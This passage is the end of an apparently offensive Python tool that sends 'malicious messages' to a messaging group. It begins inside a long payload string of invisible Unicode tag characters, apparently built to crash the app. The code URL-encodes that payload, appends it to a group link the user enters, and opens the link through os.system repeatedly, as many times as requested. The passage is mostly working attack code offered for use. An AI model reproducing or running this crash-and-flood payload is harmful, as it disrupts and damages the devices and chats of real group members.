󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊"""}
        data = urllib.parse.urlencode(crash)
        group_link = input(Fore.GREEN+ "Enter group link: ")
        url = group_link + "?" + data
        send_malicious_message = "xdg-open " + url
        try:
            global Tiimes
            Tiimes = int(input(Fore.RED + "\nEnter the number of sending malicious messages: "))
        except ValueError:
            print(Fore.RED + "Value must be an integer only")
            t.sleep(2)
            loop()
        for x in range(1, Tiimes + 1):
          os.system(send_malicious_message)
          t. sleep(15)
    else:
        print(Fore.RED + "Invalid option")
        t.sleep(3)
        loop()
    cont = input(Fore.YELLOW + "Do you want to continue? [y\\n]: ").strip().upper()
    if cont == "Y":
        loop()
    elif cont == "N":
        exit()
    else:
        print(Fore.RED + "It can't be empty or can\'t contains any other world apart from \"N\" or \"Y\"\nIt has been seen has typo error\nIt has been set to 'Yes' as default")
        t.sleep(3)
        loop()
        
loop()